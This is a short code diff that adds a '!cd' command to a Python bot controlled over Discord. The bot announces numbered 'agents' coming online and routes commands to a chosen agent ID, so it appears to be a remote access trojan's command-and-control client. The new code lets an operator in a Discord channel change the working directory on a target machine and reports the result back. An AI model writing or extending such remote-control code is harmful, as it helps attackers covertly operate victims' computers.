@@ -156,6 +156,20 @@ except Exception:
             MSG = f"Agent Online #{ID}"
             color = 0x0000FF
 
+@client.command(name='cd',pass_context=True)
+async def cd(context):
+    command = context.message.content.replace("!cd ", "")
+    word_list = command.split()
+    if int(word_list[0]) == int(ID):
+        path = word_list[1]
+        try:
+            os.chdir(path)
+            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while changing directory:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+
 @client.command(name='process',pass_context=True)
 async def process(context):
     command = context.message.content.replace("!process ", "")
